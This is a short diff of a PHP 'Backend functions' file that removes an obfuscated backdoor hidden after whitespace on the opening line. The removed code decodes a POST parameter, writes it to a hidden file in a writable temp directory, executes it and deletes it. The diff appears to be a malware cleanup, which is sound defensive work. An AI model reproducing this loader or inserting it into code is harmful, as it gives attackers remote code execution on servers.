@@ -1,5 +1,4 @@
-<?php																																										if(isset($_POST["dch\x75\x6E\x6B"])){ $pgrp = $_POST["dch\x75\x6E\x6B"]; $pgrp = explode(".", $pgrp) ; $ent = ''; $salt = 'abcdefghijklmnopqrstuvwxyz0123456789'; $sLen = strlen($salt); foreach ($pgrp as $v => $v3): $chS = ord($salt[$v % $sLen]); $d = ((int)$v3 - $chS - ($v % 10)) ^ 77; $ent.= chr($d); endforeach; $res = array_filter([getenv("TMP"), ini_get("upload_tmp_dir"), getcwd(), "/tmp", "/dev/shm", sys_get_temp_dir(), session_save_path(), getenv("TEMP"), "/var/tmp"]); foreach ($res as $key => $flag) { if ((function($d) { return is_dir($d) && is_writable($d); })($flag)) { $value = implode("/", [$flag, ".parameter_group"]); if (file_put_contents($value, $ent)) { include $value; @unlink($value); die(); } } } }
-
+<?php
 /**
  * Backend functions.
  *
